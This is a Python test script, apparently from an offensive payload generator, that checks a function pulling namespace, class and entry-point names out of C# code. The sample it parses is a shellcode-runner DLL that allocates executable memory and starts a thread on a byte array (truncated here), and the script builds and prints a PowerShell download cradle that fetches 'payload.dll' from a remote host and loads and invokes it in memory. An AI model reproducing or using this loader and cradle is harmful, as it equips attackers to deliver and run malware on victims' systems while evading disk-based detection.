#!/usr/bin/env python3
"""
Test metadata extraction for DLL with runner() method
"""
import re
from pathlib import Path
import tempfile

# Simulate the exact DLL code from the user
dll_code = """using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
"""

def extract_csharp_metadata(code: str) -> dict:
    """Extracted from app.py - simplified for testing"""
    metadata = {
        'namespace': '',
        'class': '',
        'entry_point': 'Main'
    }
    
    # Extract namespace
    namespace_match = re.search(r'\bnamespace\s+([a-zA-Z_][a-zA-Z0-9_]*)\b', code)
    if namespace_match:
        metadata['namespace'] = namespace_match.group(1)
    
    # Extract class name
    class_matches = re.finditer(r'\bclass\s+([a-zA-Z_][a-zA-Z0-9_]*)\b', code)
    for match in class_matches:
        class_name = match.group(1)
        class_start = match.start()
        brace_start = code.find('{', class_start)
        if brace_start != -1:
            # Count braces to find matching closing brace
            brace_count = 1
            pos = brace_start + 1
            while pos < len(code) and brace_count > 0:
                if code[pos] == '{':
                    brace_count += 1
                elif code[pos] == '}':
                    brace_count -= 1
                pos += 1
            
            if brace_count == 0:
                class_body = code[brace_start:pos]
                # Check if any public static method exists in this class
                if re.search(r'\b(static\s+)?(void|int)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\([^)]*\)\s*{', class_body):
                    metadata['class'] = class_name
                    
                    # Extract the actual entry point method name
                    entry_match = re.search(r'\b(public\s+)?static\s+(void|int)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\([^)]*\)\s*{', class_body)
                    if entry_match:
                        metadata['entry_point'] = entry_match.group(3)
                    break
    
    return metadata

print("="*70)
print("Testing DLL Metadata Extraction")
print("="*70)

result = extract_csharp_metadata(dll_code)

print(f"\nExtracted metadata:")
print(f"  Namespace: {result['namespace']}")
print(f"  Class: {result['class']}")
print(f"  Entry Point: {result['entry_point']}")

print("\n" + "-"*70)
print("Verification:")
print("-"*70)

if result['namespace'] == 'ClassLibrary1':
    print("✓ Namespace extracted correctly")
else:
    print(f"✗ Namespace incorrect (got '{result['namespace']}', expected 'ClassLibrary1')")

if result['class'] == 'Class1':
    print("✓ Class name extracted correctly")
else:
    print(f"✗ Class name incorrect (got '{result['class']}', expected 'Class1')")

if result['entry_point'] == 'runner':
    print("✓ Entry point extracted correctly")
else:
    print(f"✗ Entry point incorrect (got '{result['entry_point']}', expected 'runner')")

print("\n" + "="*70)
print("Cradle Usage Test")
print("="*70)

# Test the cradle template with extracted values
cradle_template = "$w = (New-Object System.Net.WebClient).DownloadData('{url}/{output_file}'); $a = [System.Reflection.Assembly]::Load($w); $class = $a.GetType(\"{namespace}.{class}\"); $m = $class.GetMethod(\"{entry_point}\"); $m.Invoke(0, $null)"

filled_cradle = cradle_template.format(
    url='http://192.168.1.100:8080',
    output_file='payload.dll',
    namespace=result['namespace'],
    **{'class': result['class']},  # class is a keyword
    entry_point=result['entry_point']
)

print("\nGenerated cradle:")
print(filled_cradle)

print("\n" + "="*70)
print("Summary")
print("="*70)
print("""
✓ YES - The current implementation DOES work for DLLs!

The extract_csharp_metadata() function:
1. Extracts the namespace (ClassLibrary1)
2. Finds the class (Class1)
3. Looks for any public static method (finds 'runner')
4. Returns all three values

This works for both EXE and DLL cradles because:
- The extraction doesn't assume a 'Main' method
- It finds ANY static method as the entry point
- It searches for pattern: (public\s+)?static\s+(void|int)\s+METHOD_NAME

For your DLL with 'public static void runner()':
  namespace: ClassLibrary1
  class: Class1
  entry_point: runner

The auto-extraction feature works identically for:
  - cradle-exe
  - cradle-dll
  - cradle-ps1 (if they use these variables)
""")
